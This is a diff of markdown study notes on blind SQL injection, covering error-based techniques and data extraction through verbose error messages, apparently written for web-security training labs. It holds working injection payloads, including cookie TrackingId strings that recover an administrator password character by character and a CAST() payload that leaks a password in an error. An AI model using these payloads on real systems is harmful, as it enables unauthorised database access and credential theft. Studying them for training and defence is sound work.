@@ -115,10 +115,24 @@
     * ... Confirm that the first character of the password is `s`
   * We can continue this process to systematically determine the full password for the Administrator user.
 
-**EXAMPLE**
+### Error-based SQL injection
 
-<pre class="language-markdown"><code class="lang-markdown"><strong># In this example the response are always the same. 
-</strong><strong># However, if you submit an invalid query you will get an error.
+* Problem: Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique "Triggering conditional responses" won't work, because injecting different boolean conditions makes no difference to the application's responses.
+* It's often possible to induce the application to return a different response depending on whether a SQL error occurs and extract or infer sensitive data from the database, even in blind contexts.
+* `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
+  * The CASE expression evaluates to 'a', which does not cause any error.
+* `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
+  * It evaluates to 1/0, which causes a divide-by-zero error.
+* You can use this to determine whether the injected condition is true.
+* `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
+* Note: There are different ways of triggering conditional errors, and different techniques work best on different database types. See SQL cheat sheet
+
+<details>
+
+<summary>Example</summary>
+
+<pre class="language-markdown"><code class="lang-markdown"># In this example the response are always the same. 
+<strong># However, if you submit an invalid query you will get an error.
 </strong><strong>
 </strong><strong># 1 - Check if it's vulnerable
 </strong>## Normal request. 200 OK
@@ -148,17 +162,13 @@ Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM us
 Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'b') THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
 </code></pre>
 
-### Error-based SQL injection
+</details>
 
-* Problem: Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique "Triggering conditional responses" won't work, because injecting different boolean conditions makes no difference to the application's responses.
-* It's often possible to induce the application to return a different response depending on whether a SQL error occurs and extract or infer sensitive data from the database, even in blind contexts.
-* `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
-  * The CASE expression evaluates to 'a', which does not cause any error.
-* `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
-  * It evaluates to 1/0, which causes a divide-by-zero error.
-* You can use this to determine whether the injected condition is true.
-* `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
-* Note: There are different ways of triggering conditional errors, and different techniques work best on different database types. See SQL cheat sheet
+**Extracting sensitive data via verbose SQL error messages**
+
+* Example: inject `'` and you get an error: `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`
+* You can use the `CAST()` function to turns an otherwise blind SQL injection vulnerability into a visible one
+* `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
 
 ### Time-based SQL injection
 
